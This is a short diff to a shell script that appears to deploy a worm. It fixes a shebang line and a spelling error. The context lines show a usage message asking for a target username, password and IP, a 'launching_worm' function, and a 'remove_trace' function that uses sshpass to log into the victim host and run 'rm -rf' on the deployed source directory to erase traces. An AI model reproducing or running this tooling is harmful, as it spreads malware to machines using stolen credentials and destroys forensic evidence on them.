@@ -1,4 +1,4 @@
-#/bin/sh
+#!/bin/sh
 
 usage() {
   echo "Usage: $0 <target username> <target password> <target IP>" 1>&2;
@@ -24,7 +24,7 @@ launching_worm() {
 }
 
 remove_trace() {
-  echo "Removeing Trace..."
+  echo "Removing Trace..."
   sshpass -p "$victim_password" ssh "$victim_ip" -l "$victim_username" "rm -rf $target_dir/src"
 }
 
